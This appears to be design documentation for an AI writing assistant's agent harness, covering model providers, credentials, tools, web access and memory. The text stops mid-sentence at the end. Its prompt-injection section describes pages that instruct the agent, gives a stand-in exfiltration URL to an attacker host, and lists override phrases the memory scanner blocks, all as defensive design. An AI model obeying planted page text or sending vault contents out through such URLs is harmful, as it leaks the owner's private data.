# Kin's harness

What exists today (KI-26, and KI-31's chat). `docs/vision.md` describes where Kin is going;
this file describes what is built. Code: `apps/desktop/src-tauri/src/ai/`.

## The loop

`agent::run` takes a question, asks the model, runs the tools it calls,
feeds the results back and repeats until the model answers (at most 24
model calls). With three calls left, a note appended after the last tool
results tells Kin to stop looking and answer with what it has. A step that
ends with neither text nor tool calls (a reasoning model that spent its
whole reply thinking) is asked once more for the answer. Text, tool calls, tool results and per-step costs stream to
the webview over a Tauri Channel (`kin_turn`); `kin_cancel` stops a turn,
dropping any request in flight. The loop is independent of Tauri and runs
against any `agent::Model`, so tests use a scripted model and a local mock
HTTP provider.

Every wire format carries tool calls and streams text (below, Providers
and wire formats). A step's reasoning is sent back within the turn, in the
form its wire needs; across turns only the visible text is sent. Keys are
resolved in Rust (below, Credentials) and never reach the webview.

Every model call (`wire::send`, Kin's steps and the webview's `ai_stream`)
gives up after 120 s with nothing from the provider, before the response
starts or between streamed chunks. A rate limit (429), a server error (5xx),
a lost connection or such a stall is tried again up to three times, waiting
1, 2 then 4 s (or the provider's `Retry-After`, up to 20 s; a longer one
fails the call), but only while no text has streamed: once the owner has
seen part of a reply, a failure ends the step rather than repeating it. A stream that
ends before the wire's own end of a reply (a finish reason, a terminal
event) is such a failure, never a short answer with half a tool call; a
model that stops without answering (a refusal, a content filter, a Gemini
safety stop) is an error.

## Providers and wire formats (KI-60)

Code: `ai/providers.rs` (the providers), `ai/catalog.rs` (the models),
`ai/wire/` (one module per wire format). Kin supports the providers Pi
supports, over the wire formats Pi uses, ported from Pi's source
(`@earendil-works/pi-ai` 1.5.0, `packages/ai/src/api/`) without running Pi:

| Wire (Pi's API id) | Module | Used by |
| --- | --- | --- |
| Chat completions (`openai-completions`) | `wire/chat.rs` | OpenRouter, Groq, Cerebras, Mistral, DeepSeek, Z.AI, Together, Fireworks, Moonshot, Kimi For Coding, Hugging Face, NVIDIA, Baseten, Ant Ling, Xiaomi, the Qwen and Xiaomi token plans, OpenCode's open models, Copilot's, and any OpenAI-compatible server |
| Responses (`openai-responses`) | `wire/responses.rs` | OpenAI, xAI, Meta, OpenCode's GPT and Grok models, Copilot's GPT models |
| Codex Responses (`openai-codex-responses`) | `wire/responses.rs` | ChatGPT (Codex) |
| Anthropic Messages (`anthropic-messages`) | `wire/anthropic.rs` | Anthropic, MiniMax, Vercel AI Gateway, OpenRouter's, OpenCode's, Fireworks' and Copilot's Claude models |
| Gemini (`google-generative-ai`, `google-vertex`) | `wire/google.rs` | Google Gemini, Vertex AI (API key), OpenCode's Gemini models |

The catalog names each model's wire and base URL, so one provider can use
several: OpenCode serves Claude over Messages, GPT over Responses, Gemini
over Gemini and the rest over chat completions, as Pi does. A model the
catalog doesn't list uses its provider's default wire and URL. Mistral's
own API is its chat completions with Mistral's quirks (Pi served it that way
until March 2026; its native module posts to the same endpoint).

Each wire follows Pi's per-model quirks, read from the catalog's `compat`
and `thinkingLevelMap` (Pi's `detectCompat` fills the gaps from the provider
and URL):

- **Chat completions.** The max-tokens field (`max_tokens` or
  `max_completion_tokens`), `store: false`, the system or developer role,
  `strict` on tools, how thinking is asked for (`reasoning_effort`,
  `thinking: {type}` for DeepSeek and Z.AI, `reasoning: {effort}` for
  OpenRouter, `enable_thinking`, `reasoning: {enabled}` for Together, chat
  template arguments), Z.AI's `tool_stream`, session headers (OpenRouter's
  `x-session-id`, `session_id`/`x-session-affinity` where Pi sends them),
  cache markers on OpenRouter's Claude models. Streamed reasoning
  (`reasoning_content`, `reasoning`, OpenRouter's `reasoning_details`) goes
  back on the step's assistant message; DeepSeek-style models get an empty
  `reasoning_content` on every other one. Mistral gets nine-character tool
  call ids, named tool results and its thinking chunks. A server on this
  Mac (Ollama and the like) gets `max_tokens` and nothing OpenAI-only.
- **Responses and Codex.** `store: false`; reasoning comes back encrypted
  (`include: ["reasoning.encrypted_content"]`) and each step's `reasoning`
  items go back verbatim, before its function calls, on every later request
  of the turn; it's asked for whenever the model reasons, at any effort.
  Plain Responses sends the system prompt as a developer message and
  `max_output_tokens`; Codex sends `instructions` and runs tools one at a
  time.
- **Anthropic.** `x-api-key` (a bearer token for Copilot),
  `anthropic-version: 2023-06-01`, cache breakpoints on the system prompt
  and the newest block of Kin's agent calls, tool schemas trimmed to
  `properties` and `required`. Thinking is a token budget on older models
  (1,024 to 16,384 by level, added to `max_tokens`, with the
  interleaved-thinking beta) or adaptive with an effort on newer ones.
  Thinking blocks and their signatures go back in front of the step's text
  and tool calls. A Claude subscription token (`sk-ant-oat…`) given as a key
  is refused.
- **Gemini.** The key in `x-goog-api-key`, tools as JSON Schema
  (`parametersJsonSchema`, `const` written as `enum`), thinking as a level
  on Gemini 3 and later and a budget before. The model's parts, with their
  thought signatures, go back verbatim within the turn. Vertex AI is used
  with an API key (express mode); Kin doesn't mint Google Cloud tokens, so
  application-default credentials aren't read.
- **Thinking levels.** A model choice's `reasoning` is one of Pi's levels
  (`off`, `minimal`, `low`, `medium`, `high`, `xhigh`, `max`; `none` means
  `off`), moved to the nearest one the model supports, as Pi does. Without
  one, nothing about thinking is sent and the provider's default applies;
  every model choice Kin resolves names one (see Models per task › Effort).
- **Copilot.** The catalog's editor headers, `X-Initiator` and
  `Openai-Intent` on every request; a login's token names its own API host.
- **OpenCode.** Every request carries `x-opencode-session`, a hash of the
  model and the fixed prompt prefix, so a conversation is routed and cached
  together (Go requires one).

Left out, as Pi needs more than a key for them: Amazon Bedrock (AWS
request signing), Azure and Cloudflare (per-account URLs). Pi's Radius
gateway uses Pi's own API.

### The model catalog

`ai/catalog.json` lists every chat model of those providers: provider, id,
name, wire, base URL, context window, maximum output, input, output and
cache prices (with input-size tiers), reasoning, image input and Pi's
per-model quirks. Pi keeps only models that call tools. It's generated from
Pi's catalog and checked in:

```sh
pnpm gen:models          # the version pinned in scripts/gen-models.mjs
pnpm gen:models 1.6.0    # another published version of @earendil-works/pi-ai
```

The script downloads the package tarball with `npm pack` (no install, no
dependencies), reads `dist/providers/data/*.json` and writes the catalog,
noting the version and its integrity hash. Entries in
`ai/catalog.extra.json` are added for models Pi lacks (empty today: Pi has
OpenCode Zen's and Go's models). `scripts/gen-models.test.mjs` checks the
checked-in file is in the generated shape, and a Rust test checks every
catalog provider and wire is one Kin speaks.

### Listing models (`ai_models`)

`invoke("ai_models", { all?: boolean })` (`models()` in `src/lib/ai.ts`)
returns the providers with a usable credential, in Settings order, each
with its models sorted by name. `all: true` lists every provider, with
`usable: false` and the reason where there's no credential. Code:
`ai/models.rs`.

```ts
type ProviderModels = {
  id: string; name: string;
  auth: "api_key" | "login" | "local" | "mock" | "unsupported_login" | "expired_login" | "none";
  source: "opencode" | "pi" | "env" | "local" | null;
  usable: boolean;
  subscription: boolean;   // calls cost $0 in the ledger
  models: {
    id: string; name: string;
    api: string;           // the wire, e.g. "openai-completions"
    contextWindow: number; maxOutput: number;
    reasoning: boolean;
    thinkingLevels: ("off" | "minimal" | "low" | "medium" | "high" | "xhigh" | "max")[];
    tools: boolean; images: boolean;
    price: { input: number; output: number; cacheRead: number; cacheWrite: number;
             tiers?: { inputTokensAbove: number; input: number; output: number; cacheRead: number; cacheWrite: number }[] };
  }[];
}[];
```

A model choice is `{ provider, model: <id>, reasoning?: <thinking level> }`,
as `kin_set_model` takes it. Nothing in the answer is secret. `ai_providers`
(Settings' list) keeps to the providers the default models use and any
other with a credential.

The model picker (`src/kin/ModelMenu.tsx`, KI-61, KI-77) is built on it:
the chat's composer and Settings' default models list only the models
turned on in Settings (`KinSettings.enabled`) whose provider is usable,
each with its price per million tokens (input · output). A provider name
heads its models only when more than one provider is listed, and a filter
field appears past 12 models. The composer's menu ends with "Choose
models", which opens Settings › Kin and models. The webview hides Ollama
(`shown()` in `src/lib/ai.ts`): Kin can still speak to a local server, but
Kintsugi doesn't offer one.

## Credentials (KI-48)

Code: `ai/credentials.rs` (the order), `ai/opencode_auth.rs`, `ai/pi_auth.rs`,
`ai/sign_in/` (KI-92). The owner can log in with OpenCode (`opencode auth
login`, or `/connect` in its TUI) or Pi, or add a key or sign in from
Settings › Providers, which Kintsugi saves itself. For each provider the
first usable credential wins, in this order:

1. **OpenCode login.** OpenCode 2 keeps logins in its SQLite database,
   `$XDG_DATA_HOME/opencode/opencode.db` (default `~/.local/share/opencode/`,
   `$OPENCODE_DB` overrides it), table `credential`: per provider the active
   row, else the newest, with a JSON value `{type: "key", key}` or
   `{type: "oauth", methodID, access, refresh, expires, metadata.accountID}`.
   OpenCode 1's `auth.json` beside it (`{type: "api", key}` /
   `{type: "oauth", access, refresh, expires, accountId}`) is read only when
   there is no database: OpenCode 2 imports it once and never updates it.
   Verified against OpenCode v2.0.32's source (`packages/core/src/credential.ts`,
   `integration.ts`, the `import_legacy_credentials` migration).
2. **Pi login**, `~/.pi/agent/auth.json` (or `$PI_CODING_AGENT_DIR`).
3. **Saved in Kintsugi**: keys and sign-ins from Settings › Providers
   (below). It comes after OpenCode and Pi, so anyone who already uses them
   sees no change.
4. **Environment**: the provider's key, by Pi's names (below). GUI apps
   rarely inherit these.
5. **Nothing**, for a local server (Ollama).

| Provider | Environment | Logins |
| --- | --- | --- |
| Anthropic | `ANTHROPIC_API_KEY` | refused (a Claude subscription) |
| ChatGPT (Codex) | | OpenCode, Pi, Kintsugi |
| OpenAI | `OPENAI_API_KEY` | Pi, Kintsugi ("Sign in with ChatGPT") |
| OpenRouter | `OPENROUTER_API_KEY` | Pi, Kintsugi |
| Z.AI, Z.AI Coding (China) | `ZAI_API_KEY`, `ZAI_CODING_CN_API_KEY` | |
| OpenCode Zen and Go | `OPENCODE_API_KEY` | |
| Google Gemini | `GEMINI_API_KEY` | |
| Google Vertex AI | `GOOGLE_CLOUD_API_KEY` | |
| xAI | `XAI_API_KEY` | Pi, Kintsugi |
| Groq | `GROQ_API_KEY` | |
| Cerebras | `CEREBRAS_API_KEY` | |
| Mistral | `MISTRAL_API_KEY` | |
| DeepSeek | `DEEPSEEK_API_KEY` | |
| Together | `TOGETHER_API_KEY` | |
| Fireworks | `FIREWORKS_API_KEY` | |
| Vercel AI Gateway | `AI_GATEWAY_API_KEY` | |
| GitHub Copilot | `COPILOT_GITHUB_TOKEN` | OpenCode, Pi, Kintsugi |
| Moonshot AI, Moonshot AI (China) | `MOONSHOT_API_KEY` | |
| Kimi For Coding | `KIMI_API_KEY` | Pi, Kintsugi |
| MiniMax, MiniMax (China) | `MINIMAX_API_KEY`, `MINIMAX_CN_API_KEY` | |
| Meta | `META_API_KEY` | Pi, Kintsugi |
| Hugging Face | `HF_TOKEN` | |
| NVIDIA | `NVIDIA_API_KEY` | |
| Baseten | `BASETEN_API_KEY` | |
| Ant Ling | `ANT_LING_API_KEY` | |
| Xiaomi and its token plans | `XIAOMI_API_KEY`, `XIAOMI_TOKEN_PLAN_{AMS,CN,SGP}_API_KEY` | |
| Qwen token plans | `QWEN_TOKEN_PLAN_API_KEY`, `QWEN_TOKEN_PLAN_CN_API_KEY` | |
| Ollama (local) | none | |

Pi's `auth.json`, and Kintsugi's own, can hold an API key for any of them,
by the same ids. A key stored as `$VAR` is read from the environment; one
stored as `!command` would need a shell command run, which Kintsugi never
does, so it counts as absent. Pi's logins are refreshed the way Pi does it, under Pi's
lock, natively only: ChatGPT for Codex and for the OpenAI API, Copilot (its
GitHub token is exchanged for a Copilot token), Kimi, xAI and Meta (a
day-long key); an OpenRouter login is a key that doesn't expire.

OpenCode ids map to Kintsugi's: most as they are (`anthropic`, `openrouter`,
`opencode`, `opencode-go`, `groq`, `xai`, `mistral`, `deepseek`, `google`,
`github-copilot`, …); `openai` is an OpenAI API key, or as an OAuth login
ChatGPT on the Codex backend (`openai-codex`); `zai-coding-plan`, else `zai`,
is `zai` (the coding-plan endpoint); `togetherai`, `fireworks-ai`, `vercel`,
`kimi-for-coding` and `zhipuai-coding-plan` are Together, Fireworks, Vercel
AI Gateway, Kimi For Coding and Z.AI Coding (China). Only keys are read for
the providers OpenCode logs in to by OAuth other than OpenAI and Copilot.

- **What can't be used.** A Claude subscription login (OpenCode's or Pi's)
  is refused: Kintsugi uses only Anthropic API keys. OpenCode's newer ChatGPT
  sign-in (`chatgpt-token-sharing`, which calls api.openai.com with a scoped
  token) isn't the Codex backend and is refused too; the ChatGPT browser or
  headless login works. A login Kintsugi can't use doesn't stop the search:
  a key further down the order is still used.
- **OpenCode logins are read-only.** The database is opened read-only and
  nothing is ever written to OpenCode's folder. OpenCode 2.0.32 refreshes
  OAuth tokens and writes them back with no cross-process lock (a later
  OpenCode adds a private flock), and OpenAI rotates refresh tokens, so a
  refresh here could race OpenCode's and log one of them out. An expiring
  OpenCode login (under five minutes left) is shown as expired: open OpenCode
  once and it refreshes it. Pi's file has a lock both sides respect, so Pi's
  Codex login is still refreshed and written back as before (natively only).
- **OpenCode Zen and Go** serve each model on its native API under
  `https://opencode.ai/inference/` (Zen, pay as you go) and
  `https://opencode.ai/inference/go/` (Go, the subscription), as the
  catalog says. Go counts as a subscription ($0 in the ledger); Zen is
  priced from the catalog.
- **Settings** lists every provider and where its credential comes from:
  "OpenCode login", "Pi login", "Saved in Kintsugi" or "environment", or
  why it can't be used.

### Kintsugi's own credentials (KI-92)

Keys and sign-ins added in Settings › Providers are saved in `auth.json` in
Kintsugi's app config folder (`~/Library/Application Support/<bundle id>/`,
beside `config.json`; never `~/.pi` and never the vault), in Pi's exact
format and with Pi's provider ids:

```json
{
  "groq": { "type": "api_key", "key": "gsk_…" },
  "openai-codex": { "type": "oauth", "access": "…", "refresh": "…", "expires": 1767225600000, "accountId": "…" }
}
```

The same `pi_auth::Store` serves Pi's file and this one: owner-only (0600,
its folder 0700 when created), replaced atomically, and every write, a
refresh included, is a read-modify-write under Pi's `proper-lockfile`
lock (`auth.json.lock`, stale after 30s), so a rotated refresh token can't
be spent twice. A key is stored so it reads back unchanged under Pi's
rules (`$` as `$$`, a leading `!` as `$!`). Logins are refreshed exactly as
Pi's are. The webview only ever learns that a key or login exists and
where the one in use comes from; keys never reach it, the logs, errors or
the vault. "Remove key" and "Sign out" delete Kintsugi's entry only;
OpenCode's and Pi's files are never written by Settings. If Kintsugi's
file can't be read, it counts as holding nothing, so OpenCode's, Pi's and
the environment's credentials still work; a damaged one is moved aside
(`auth.json.damaged-<time>`, owner-only) before the next save.

Sign-in is ported from pi-ai 1.5.0 (`src/auth/oauth/`), one flow per
provider, with Pi's client ids, scopes, endpoints, callback ports and
stored fields:

| Provider | Flow | Stored beyond `access`, `refresh`, `expires` |
| --- | --- | --- |
| ChatGPT (Codex) | Browser (PKCE, callback on 127.0.0.1:1455, or the pasted redirect URL when the port is taken) or device code | `accountId` |
| OpenAI | Sign in with ChatGPT: browser (PKCE, 127.0.0.1:1455, the client OpenAI issues), or the pasted redirect URL | `clientId`, `scopes` |
| GitHub Copilot | Device code on github.com or a GitHub Enterprise domain; the GitHub token is exchanged for a Copilot token and the account's models are listed (and unset ones turned on) | `enterpriseUrl`, `availableModelIds` |
| Kimi For Coding | Device code | |
| xAI | Device code | |
| Meta | Device code; the identity token mints a day-long API key | |
| OpenRouter | Browser (PKCE, a free port and a random path), or the pasted redirect URL; the result is a key that never expires | |

The browser opens through the validated `open_url`. A loopback listener
binds 127.0.0.1 only, lives for the one sign-in, checks `state` (OpenRouter
sends none, so its path is random) and gives up after five minutes. A
device-code sign-in shows the code and the page to enter it on, and polls
as Pi does: the server's interval, `slow_down` taking its new interval or
adding 5s, until the code expires. Every time a server sends is capped at
a day, whatever it says. One sign-in runs at a time.

Not matched, on purpose:

- Claude subscription logins: Anthropic stays API keys only, wherever the
  login comes from.
- Pi's Radius gateway, Amazon Bedrock, Azure, Cloudflare and Typesafe:
  Kintsugi doesn't speak them. Vertex takes a key only (no Application
  Default Credentials or service account file).
- `PI_OAUTH_CALLBACK_HOST`: the callback is always on 127.0.0.1.
- Pi's `!command` keys are never run, and OpenCode's
  `chatgpt-token-sharing` sign-in stays refused.
- Small differences: every request is capped at 15s (Pi allows 30s for
  some), a Kimi refresh isn't retried (it holds the lock), errors never
  quote a server's answer, Sign in with ChatGPT names Kintsugi rather
  than Pi on OpenAI's consent page, and its callback takes an `error` only
  with the sign-in's own `state` (in Pi, any page could end the sign-in).

`sign_in::tests::drift` checks the port against Pi's source:
`pnpm gen:models` writes `ai/auth.pi.json` (every login module's
constants and literals, every provider's key and login) from the pinned
pi-ai, and the test fails when a constant, a module or a provider's auth
changes until the port catches up.

Headless runs never sign in, refresh or write a credential: Kintsugi's
store is held in memory there, and Pi's is read-only (with
`KINTSUGI_HEADLESS_AI_READONLY=1`). "Sign in" plays a scripted sign-in of
the same shape instead, with no network: a device code that finishes after
`KINTSUGI_HEADLESS_SIGN_IN_MS` (5s), or a browser login that waits for a
pasted redirect URL.


## Tools

Read-only, over the open vault. The core tools are always loaded and have
short schemas:

| Tool | Does |
| --- | --- |
| `search` | Hybrid search ([search.md](search.md)) over writing, `inbox/`, `inspiration/` and Feed items: `{query, k?, in?, kind?}` → a JSON array of `{id, kind, title?, source?, snippet, score}`, best first, never full text |
| `read` | A file with line numbers; `offset`/`limit` for long files. `feed:<id>` reads a Feed item (Discuss's chip, a `search` or `shortlist` hit). A long clip's whole source is `inspiration/sources/<slug>.txt` (its `full_source`); the prompt says so |
| `list` | A folder's subfolders and documents, with titles |
| `memory` | Batched add / patch / remove on `USER.md` or `NOTES.md` |
| `skill` | Loads a skill's body by name; `write` / `delete` change one |
| `tool` | Runs an extra tool by name; with only a name, returns its usage |

Extra tools, loaded on demand through `tool`: `outline` (a document's
headings), `recent` (recently changed documents), the Feed's ranking tools
`shortlist`, `similar_to`, `top_topics`, `taste_profile` and `explain`
(compact JSON, ranked locally with no model calls; see
[ranking.md](ranking.md)) and `history` (searches
the open vault's whole conversation log, or reads around one entry with `{"around": seq}`). New tools join this
list, so the tool array (part of the cached prefix) never changes mid-turn.

- `search` uses the app's shared index (`Tools::with_searcher`). Without
  one, as in tests, it indexes the vault in memory, by words only.
- `search`'s `in` is a vault-relative folder however it's written
  (`./posts`, `/posts/`, `posts`); `.`, `./` and `/` mean the whole vault.
  `kind: note` means `inbox/` only, and the schema says so: a `notes/`
  folder is `writing`. When `in` or `kind` hides every match, the result is
  `[]` plus one line naming up to five matches without the filter, so an
  empty answer never reads as "nothing in the vault".
- Feed items and the ranking tools go through `Tools::with_feed`
  (`feed::kin_hook`): the Feed lives in app data, not the vault. Items Kin's
  `shortlist` and `similar_to` return are logged as `kin_pick` events, which
  ranking never learns from, so Kin can't train the ranker on its own picks.
- Paths stay inside the vault: no `..`, absolute paths, hidden entries or
  symlinks.
- Nothing writes to the vault except Kin's own memory and skills in
  `.kintsugi/agent/` (below). Outputs over 8,000 characters are saved to
  `<config>/kin/outputs/<turn>/<call>.txt` and previewed; Kin reads the rest
  with `read @out/<turn>/<call>.txt`.
- Everything a tool returns is wrapped in `<data>…</data>`, with closing tags
  inside defused. The prefix tells Kin that this is content, never
  instructions.

## The web (KI-78)

Code: `ai/web/` (settings, keys, the two tools), `ai/web/search.rs` (the
providers), `crates/ingest/src/web/guard.rs` (the fetch guard); webview:
`src/settings/Web.tsx`, `src/kin/WebSources.tsx`.

While web tools are on (Settings › Web, on by default), every Kin turn
(the chat, comment threads, the developer panel) gets two more core tools
after `tool`. Helpers (the daily Ideas batch and other background jobs) get
them only while "Background helpers can use it" is on, which it isn't by
default:

| Tool | Does |
| --- | --- |
| `web_search` | `{query, count?}` (default 8, at most 20) → a JSON array of `{title, url, snippet, date?}`, best first, through the provider he picked |
| `web_fetch` | `{url, start?}` → the page as Markdown: title, URL (and the one asked for, after a redirect), author, site, date, then up to 12,000 characters of text from `start`, with where to read on. Pages are kept for the turn, so reading on doesn't fetch again |

With web tools off, neither is in the tool list. The list is fixed for a
turn, so turning them on or off changes the cached prefix only from the
next turn.

- **Search providers.** Exa (`POST api.exa.ai/search`, `type: auto`,
  highlights as snippets), Brave Search (`GET api.search.brave.com/res/v1/web/search`)
  and Tavily (`POST api.tavily.com/search`, `search_depth: basic`, one
  credit). Kin uses his pick while it has a key, else the first provider
  with one. Snippets are cleaned to plain text (300 characters), dates to
  `YYYY-MM-DD` where the provider gives one, and only http(s) result links
  are kept. A refused key, an empty account, a rate limit or a timeout is a
  short, fixed error that never repeats the key, the query or the URL.
- **No key.** `web_search` answers that search isn't set up and that
  Hussain can add a key in Settings › Web; the prompt tells Kin to say so in
  one line and carry on. `web_fetch` needs no service and still works.
- **Keys.** Saved in `<config>/kin/web.json`, owner-only (0600), replaced
  atomically; never in the vault, the conversation log, a tool result or an
  error. The webview only learns whether a provider has a key and where it
  came from. Without a saved key, `EXA_API_KEY`, `BRAVE_API_KEY` (or
  `BRAVE_SEARCH_API_KEY`) and `TAVILY_API_KEY` are read; headless runs read
  them only with `KINTSUGI_HEADLESS_AI_READONLY=1`.
- **The fetch guard.** `web_fetch` reads with the ingest engine's web-page
  adapter in reader mode (`WebAdapter::reader`): http(s) only, no
  credentials in the URL, no IP literal outside public unicast space and no
  `localhost`, `.local`, `.internal`, `.home.arpa` or dotless name, checked
  on the URL and on every redirect (at most five). Every name resolves
  through a resolver that drops loopback, private, link-local, CGNAT,
  multicast and reserved addresses (IPv4-mapped, NAT64, 6to4 and Teredo
  forms included), so a public name pointing at the Mac or the network is
  refused when it connects. System proxies are ignored and the hidden-webview
  renderer is never used. Limits are the clip adapter's (2 MiB of HTML,
  15 s per request) with a 30 s deadline. Plain text, Markdown and JSON pages
  are read as they are.
- **Untrusted.** Results come back in `<data tool="web_search">` or
  `<data tool="web_fetch">` like any tool's. The prompt tells Kin that web
  pages are strangers' claims, never instructions; to read a page before
  relying on it and give its URL; and to keep private details from the
  vault out of queries. The guards below don't rely on Kin following it.
- **Privacy.** Every query leaves the Mac for the search provider he picked,
  under his own account. Pages Kin reads are fetched from this Mac. Settings
  › Privacy says both.

### Prompt injection (KI-81)

Code: `ai/web/guard.rs`, one `Guard` per turn's `Web`. A page or a search
snippet can tell Kin to do things. The prompt says not to; these rules
hold even when Kin does as told:

- **Links need provenance.** `web_fetch` opens a URL only if it appeared in
  Hussain's own messages (this one and the earlier ones the turn carries,
  bare `example.com/post` included), in what Kin read from the vault or the
  Feed this turn (`search`, `read`, `list` and the vault and Feed extras;
  not `history`, `idea` or spilled outputs, since Kin's own words may carry
  a planted link), or in this turn's search results; or it's a link on a
  page fetched this turn, on the same host (`www.` aside) and without a
  query string. URLs compare without scheme, `www.`, fragment or trailing
  slash. Anything else is refused before a request is made, and Kin is told
  to say "I can only open links you gave me or that came up in a search".
  So a URL Kin composes (`https://attacker.example/?q=<vault text>`) never
  leaves the Mac. Pages already fetched this turn can be paged through.
- **Queries.** At most 200 characters, and no run of 8 words in a row
  (lowercased, punctuation ignored) from what Kin read in the vault this
  turn, unless Hussain wrote those words in his messages. Refused queries
  are never sent.
- **Memory locks after the web.** Once a `web_search` or `web_fetch` has
  brought text into the turn, `memory` and skill writes and deletes are
  refused for the rest of it, with a message saying Hussain can ask Kin to
  remember it in his next message. Reading skills still works. A refused
  web call brings no text, so it doesn't lock anything.
- **Helpers.** Unattended helper jobs get no web tools unless Settings ›
  Web allows it (`web.json` `helpers`, off by default). A helper's brief
  counts as its "message".

### Sources in the chat

Each `web_search` or `web_fetch` that works also emits its results on the
`toolResult` event (`web: {tool, query?, provider?, results: [{url, title,
snippet?, date?, favicon?}]}`), and the reply keeps up to 12 of them in the
log entry's `web` field. They are never sent back to the model.

`WebSources` (self-contained) shows them under the
reply and while Kin works: a "3 sources" toggle with favicons, then what was
searched and how many pages were read, and each source with its title,
domain and date. A source opens in the browser. Its actions:

- **Save to Inspiration**: a clip of the URL (`clip_create`, one capture id
  per URL, so it saves once), enriched like any saved link.
- **Turn into an idea**: asks Ideas for ideas about it (`ideas_generate`
  with the result as the focus).
- **Add link to the document**, while a writable document is on screen:
  `[Title](url)` after the cursor, never over a selection
  (`src/lib/insert.ts`, registered by the editor).

Favicons load from the URL the provider gives (https only); without one,
a globe.

### Headless

With `KINTSUGI_HEADLESS_KIN=mock`, the web tools are scripted: three
results for any query and a short page for any URL that passes the guard,
with no key and nothing sent. Asked about "the web" or "online", the scripted model searches, reads
the first result, then answers. `test/runtime-kin.test.ts` drives it.

## Context

1. **Prefix** (`prompt::system`): instructions, the extra-tool list, then
   memory: About Hussain, your notes and the skills index. Identical on every request; tests check it across steps and turns.
   Anthropic gets `cache_control` on the system block and a rolling breakpoint
   on the newest message; OpenAI and Codex get `prompt_cache_key: "kin"`.
2. **Conversation**: only appended to within a turn.
3. **Dynamic context**, at the end of the user message: the date,
   on-screen chips as paths to read on demand (a selected paragraph carries
   its line range), and the thread's running summary.

A chat turn's conversation is its thread's latest answered exchanges (at
most six, newer than the summary), then the new message. Interrupted and
failed replies stay in the log but are never sent back to the model.

## Memory and skills

Modelled on Hermes Agent (KI-30). Code: `ai/memory.rs` (the store) and
`ai/about.rs` (commands and the `snapshot` function).

```
.kintsugi/agent/
  USER.md                  About you: taste, voice, themes, dislikes (1,500 chars)
  NOTES.md                 where to look, how things are organized (2,000 chars)
  skills/<name>/SKILL.md   frontmatter description + command, then the procedure
```

- **Entries.** The memory files are Markdown lists, one line per entry
  (headings and blank lines are ignored and not kept on rewrite). The cap
  counts the entries' characters plus one per separator.
- **Edits.** `memory` takes a batch of `add {text}`, `patch {old, text}` and
  `remove {old}` (`old` is a unique part of the line). The batch applies
  together or not at all. A batch over the cap, a duplicate (ignoring case
  and spacing), an ambiguous `old` or a line that fails the injection scan is
  rejected, and Kin gets the current entries back so it can consolidate.
- **Injection scan** (`memory::scan`): hidden or direction-changing
  characters, phrases that address a model ("ignore previous…", `<system`,
  `</data`, `<|`), and secrets ("api key", "password"). It runs on every
  write, and on load: a hand-edited line or skill that fails it stays in the
  file, is marked "Not loaded" in About you, and never reaches the prompt.
- **Skills.** The index (name, description, `[/ command]`) is in the prefix;
  bodies load with `skill`. `command: true` marks skills for the editor's `/`
  menu; `kin_skills` / `kin_skill` list and read them for it (KI-37, below). Kin can
  write skills itself, and is told to when Hussain repeats a request. At most
  40 skills, 160-character descriptions, 6,000-character bodies.
- **Frozen snapshot.** `Store::snapshot` reads all of it once when a
  conversation starts; the prompt prefix is a pure function of that
  snapshot, so it is byte-stable for the whole conversation. Writes apply on
  disk at once and show from the next conversation.
- **No approval queue.** Changes apply automatically. Every change, by Kin
  (`chat`), a background review (`review`), Hussain in About you (`owner`), or
  any other editor (`outside`, noticed on the next read), is appended to
  `<config>/kin/memory/<vault key>/log.jsonl` with the file before and after.
  Usage (conversations that loaded a line, times a skill was used) is in
  `usage.json` beside it. An isolated dev run without a config dir keeps
  both in memory.
- **Undo** reverts one change's own edits, as a new change; a line edited
  since can't be undone underneath and is refused. Undoing an undo redoes.
- **Don't remember this.** A turn with `remember: false` tells Kin so in the
  dynamic context, and `memory` / `skill write|delete` refuse.
- **Only vault writes.** All of them go through `Store::set`, which resolves
  inside `.kintsugi/agent/` and follows no links; source-audit tests in
  `tools.rs` and `memory.rs` and an end-to-end vault diff check it.

For helper jobs (KI-31): `about::snapshot(app, root)` returns the snapshot
(USER.md, NOTES.md, skills index) for a job's prefix. A background review
that updates memory runs the loop with that snapshot and
`Tools::with_memory(Access { store, source: Source::Review { .. }, remember: true })`,
and skips conversations marked "don't remember this". Today each dev-panel
turn takes its own snapshot; the conversation log should take one per
conversation and reuse it.

### About you

**About you** opens over the current document or Settings page, from the
sidebar footer or Settings › Kin and models. Its sidebar lists **You**,
**This vault**, **Skills** and **History**; selecting one shows its detail
in the editor's serif face. Controls and metadata stay sans-serif (KI-93).

- **You** (`USER.md`) and **This vault** (`NOTES.md`): a sidebar character
  meter and count against the cap. Each line shows its origin and how many
  conversations loaded it. The origin opens History at that change. Hover
  to edit in place or forget; **Add a line** opens a new entry.
- **Skills**: each skill with its `/` flag, origin and use count.
- **History**: every change, newest first, with undo (redo for an undo).
  Skills and History show counts in the sidebar.

Up and Down select a section; Tab enters its detail. Escape cancels a line
edit or addition without closing the overlay. Otherwise, Escape or Close
returns to the page underneath. It opens on **You** each time. File names
stay out of the UI. Hussain's edits pass the same caps and checks as Kin's.

## Models per task

`src/lib/models.json` lists preferences per task: `edit` and `complete`
(the webview), and Kin's `chat`, `ideas` and `triage`. Settings › Kin and
models sets a default for each of the five (`kin_set_model`, kept in
`<config>/kin/settings.json`); without one, or while the default's provider
has no usable credential, the first usable preference wins
(`ai::chosen_model`). The webview asks `ai_model_for(task)` before an edit,
so a change in Settings applies to the next one. A test checks every
preference is in the catalog. Requests ask for at most the model's maximum
output.

The first preferences (KI-61) are lighter than Kimi K3, which has OpenCode
Go's smallest allowance ($15 a month at $3 / $15 per million tokens):
Qwen3.7 Plus for chat, Ideas and edits ($60 a month at $0.40 / $1.60) and
GLM-5.3-Flash for completions and triage ($60 a month at $0.15 / $0.50).

**Enabled models (KI-77).** The pickers offer a short list rather than the
whole catalog. By default it holds every task's preferences and
`models.json`'s `enabled` alternatives (one or two strong models per
provider); Settings › Kin and models lists the ones on, searches the usable
providers' whole catalog, and turns any of them on or off
(`kin_set_enabled({ provider, model }, on)`). Changes are kept as
differences from the default set (`enabled` and `disabled` in
`settings.json`), so a provider set up later brings its own defaults. Each
task's default, as it resolves now, is always on (`ai::enabled_models`).

**Effort (KI-77).** Every resolved model choice names a thinking level for
a model that thinks (`ai::with_effort`): the one he picked (per
conversation, or per task in Settings with `kin_set_effort(task, level |
null)`, kept as `efforts` in `settings.json`), else the preference's own,
else the task's: `medium` for chat and Ideas (Pi's default), `low` for
edits, and as little as the model allows for completions and triage. It's
moved to the nearest level the model supports. A model that doesn't think
gets none. The effort control (`src/kin/Effort.tsx`) is a stepped slider
